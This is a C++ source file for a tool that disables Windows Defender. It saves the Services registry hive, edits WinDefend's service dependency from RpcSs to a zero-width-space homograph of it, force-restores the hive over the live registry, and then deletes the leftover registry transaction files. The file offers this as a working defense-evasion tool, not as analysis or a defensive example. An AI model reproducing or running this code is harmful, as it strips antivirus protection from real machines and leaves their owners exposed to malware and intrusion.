// Implementation of Windows Defender Security Engine management

#include "DefenderManager.h"
#include "common.h"
#include <filesystem>
#include <algorithm>
#include <iostream>

using namespace std;
namespace fs = std::filesystem;

// Console color helper (using existing SetColor function from main application)
extern void SetColor(int color);

// ============================================================================
// PUBLIC INTERFACE IMPLEMENTATION
// ============================================================================

// Disables Windows Defender security engine by modifying registry dependencies
bool DefenderManager::DisableSecurityEngine() noexcept 
{
    std::wcout << L"Disabling Windows Security Engine...\n";
    return ModifySecurityEngine(false);
}

// Enables Windows Defender security engine by modifying registry dependencies
bool DefenderManager::EnableSecurityEngine() noexcept 
{
    std::wcout << L"Enabling Windows Security Engine...\n";
    return ModifySecurityEngine(true);
}

// Queries current Windows Defender state by checking RpcSs (enabled) - Homograph Attack
DefenderManager::SecurityState DefenderManager::GetSecurityEngineStatus() noexcept 
{
    try {
        HKEY key;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, WINDEFEND_KEY, 0, KEY_READ, &key) != ERROR_SUCCESS) {
            return SecurityState::UNKNOWN;
        }
        
        auto values = ReadMultiString(key, DEPEND_VALUE);
        RegCloseKey(key);
        
        if (values.empty()) return SecurityState::UNKNOWN;
        
        // Check if RpcSs (active) or RpcSs\x200B (inactive) is present
        bool hasActive = find(values.begin(), values.end(), RPC_SERVICE_ACTIVE) != values.end();
        bool hasInactive = find(values.begin(), values.end(), RPC_SERVICE_INACTIVE) != values.end();
        
        if (hasActive) return SecurityState::ENABLED;
        if (hasInactive) return SecurityState::DISABLED;
        
        return SecurityState::UNKNOWN;
    }
    catch (...) {
        return SecurityState::UNKNOWN;
    }
}

// ============================================================================
// CORE OPERATIONS IMPLEMENTATION
// ============================================================================

// Core registry manipulation logic - creates snapshot, modifies dependencies, and restores atomically
bool DefenderManager::ModifySecurityEngine(bool enable) noexcept 
{
    try {
        // Enable required privileges first
        if (!EnableRequiredPrivileges()) {
            std::wcout << L"Failed to enable required privileges - run as administrator\n";
            return false;
        }
        
        // Create registry working context
        RegistryContext ctx;
        if (!CreateRegistrySnapshot(ctx)) {
            std::wcout << L"Failed to create registry snapshot\n";
            return false;
        }
        
        // Modify defender dependencies
        if (!ModifyDefenderDependencies(ctx, enable)) {
            std::wcout << L"Failed to modify Defender dependencies\n";
            return false;
        }
        
        // Restore modified registry
        if (!RestoreRegistrySnapshot(ctx)) {
            std::wcout << L"Failed to restore registry snapshot\n";
            return false;
        }
        
        std::wcout << L"Security engine " << (enable ? L"enabled" : L"disabled") << L" successfully\n";
        std::wcout << L"System restart required to apply changes\n";
        return true;
    }
    catch (...) {
        std::wcout << L"Exception in ModifySecurityEngine\n";
        return false;
    }
}

// Creates temporary registry snapshot by saving Services hive to temp file and loading as HKLM\Temp
bool DefenderManager::CreateRegistrySnapshot(RegistryContext& ctx) noexcept 
{
    ctx.tempPath = ::GetSystemTempPath();
    if (ctx.tempPath.empty()) {
        std::wcout << L"Failed to get system temp path\n";
        return false;
    }
    
    // Ensure temp directory exists and is writable
    if (!PathUtils::ValidateDirectoryWritable(ctx.tempPath)) {
        std::wcout << L"Cannot write to temp directory: " << ctx.tempPath << L"\n";
        return false;
    }
    
    ctx.hiveFile = ctx.tempPath + L"Services.hiv";
    
    // Clean up any existing hive file
    if (fs::exists(ctx.hiveFile) && !DeleteFileW(ctx.hiveFile.c_str())) {
        std::wcout << L"Failed to delete existing hive file\n";
        return false;
    }
    
    // Unload any existing temp registry hive
    HKEY tempCheck;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Temp", 0, KEY_READ, &tempCheck) == ERROR_SUCCESS) {
        RegCloseKey(tempCheck);
        RegUnLoadKeyW(HKEY_LOCAL_MACHINE, L"Temp");
    }
    
    // Save current services registry hive
    HKEY servicesKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, SERVICES_KEY, 0, KEY_READ, &servicesKey) != ERROR_SUCCESS) {
        std::wcout << L"Failed to open Services registry key\n";
        return false;
    }
    
    LONG result = RegSaveKeyExW(servicesKey, ctx.hiveFile.c_str(), nullptr, REG_LATEST_FORMAT);
    RegCloseKey(servicesKey);
    
    if (result != ERROR_SUCCESS) {
        std::wcout << L"Failed to save registry hive: " << result << L"\n";
        return false;
    }
    
    // Load saved hive as temporary key
    if (RegLoadKeyW(HKEY_LOCAL_MACHINE, L"Temp", ctx.hiveFile.c_str()) != ERROR_SUCCESS) {
        std::wcout << L"Failed to load registry hive as temp key\n";
        return false;
    }
    
    return true;
}

// Modifies Windows Defender service dependencies in temp registry by transforming RpcSs↔RpcSs\x200B
bool DefenderManager::ModifyDefenderDependencies(const RegistryContext& ctx, bool enable) noexcept 
{
    HKEY tempKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Temp\\WinDefend", 0, KEY_READ | KEY_WRITE, &tempKey) != ERROR_SUCCESS) {
        std::wcout << L"Failed to open temporary WinDefend key\n";
        return false;
    }
    
    auto values = ReadMultiString(tempKey, DEPEND_VALUE);
    if (values.empty()) {
        std::wcout << L"No DependOnService values found\n";
        RegCloseKey(tempKey);
        return false;
    }
    
    // Transform RPC service dependency
    for (auto& value : values) {
        if (enable && value == RPC_SERVICE_INACTIVE) {
            value = RPC_SERVICE_ACTIVE;  // RpcSs\x200B -> RpcSs (enable)
        }
        else if (!enable && value == RPC_SERVICE_ACTIVE) {
            value = RPC_SERVICE_INACTIVE; // RpcSs -> RpcSs\x200B (disable)
        }
    }
    
    bool success = WriteMultiString(tempKey, DEPEND_VALUE, values);
    RegCloseKey(tempKey);
    
    if (!success) {
        std::wcout << L"Failed to write modified dependency values\n";
        return false;
    }
    
    return true;
}

// Restores modified registry snapshot to live system by unloading temp hive and forcing restore
bool DefenderManager::RestoreRegistrySnapshot(const RegistryContext& ctx) noexcept 
{
    // Unload temporary registry hive
    if (RegUnLoadKeyW(HKEY_LOCAL_MACHINE, L"Temp") != ERROR_SUCCESS) {
        std::wcout << L"Warning: Failed to unload temporary registry hive\n";
    }
    
    // Restore modified hive to live registry
    HKEY servicesKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, SERVICES_KEY, 0, KEY_WRITE, &servicesKey) != ERROR_SUCCESS) {
        std::wcout << L"Failed to open Services key for restore\n";
        return false;
    }
    
    LONG result = RegRestoreKeyW(servicesKey, ctx.hiveFile.c_str(), REG_FORCE_RESTORE);
    RegCloseKey(servicesKey);
    
    if (result != ERROR_SUCCESS) {
        std::wcout << L"Failed to restore modified registry hive: " << result << L"\n";
        return false;
    }
    
    return true;
}

// ============================================================================
// PRIVILEGE MANAGEMENT IMPLEMENTATION
// ============================================================================

// Enables SE_BACKUP_NAME, SE_RESTORE_NAME and SE_LOAD_DRIVER_NAME privileges required for registry operations
bool DefenderManager::EnableRequiredPrivileges() noexcept 
{
	return PrivilegeUtils::EnablePrivilege(SE_BACKUP_NAME) &&
		   PrivilegeUtils::EnablePrivilege(SE_RESTORE_NAME) &&
		   PrivilegeUtils::EnablePrivilege(SE_LOAD_DRIVER_NAME);
}

// ============================================================================
// HELPER UTILITIES IMPLEMENTATION
// ============================================================================

// Reads REG_MULTI_SZ registry value as string vector by parsing null-terminated strings
vector<wstring> DefenderManager::ReadMultiString(HKEY key, const wstring& valueName) noexcept 
{
    DWORD type, size;
    if (RegQueryValueExW(key, valueName.c_str(), nullptr, &type, nullptr, &size) != ERROR_SUCCESS || 
        type != REG_MULTI_SZ) {
        return {};
    }
    
    vector<wchar_t> buffer(size / sizeof(wchar_t));
    if (RegQueryValueExW(key, valueName.c_str(), nullptr, &type, 
                        reinterpret_cast<BYTE*>(buffer.data()), &size) != ERROR_SUCCESS) {
        return {};
    }
    
    vector<wstring> result;
    const wchar_t* current = buffer.data();
    
    while (*current != L'\0') {
        result.emplace_back(current);
        current += result.back().size() + 1;
    }
    
    return result;
}

// Writes string vector to REG_MULTI_SZ registry value with proper double null terminator
bool DefenderManager::WriteMultiString(HKEY key, const wstring& valueName, 
                                      const vector<wstring>& values) noexcept 
{
    vector<wchar_t> buffer;
    
    for (const auto& str : values) {
        buffer.insert(buffer.end(), str.begin(), str.end());
        buffer.push_back(L'\0');
    }
    buffer.push_back(L'\0'); // Double null terminator
    
    return RegSetValueExW(key, valueName.c_str(), 0, REG_MULTI_SZ,
                         reinterpret_cast<const BYTE*>(buffer.data()),
                         static_cast<DWORD>(buffer.size() * sizeof(wchar_t))) == ERROR_SUCCESS;
}

// ============================================================================
// REGISTRY CONTEXT CLEANUP IMPLEMENTATION
// ============================================================================

// Cleans up temporary registry files including hive, transaction logs and regtrans-ms files
void DefenderManager::RegistryContext::Cleanup() noexcept 
{
    if (hiveFile.empty()) return;
    
    // Standard cleanup patterns
    vector<wstring> patterns = {
        hiveFile,
        hiveFile + L".LOG1",
        hiveFile + L".LOG2", 
        hiveFile + L".blf"
    };
    
    for (const auto& file : patterns) {
        DeleteFileW(file.c_str());
    }
    
    // Clean transaction files
    try {
        for (const auto& entry : fs::directory_iterator(tempPath)) {
            if (entry.path().extension() == L".regtrans-ms") {
                DeleteFileW(entry.path().c_str());
            }
        }
    }
    catch (...) {
        // Ignore cleanup errors
    }
}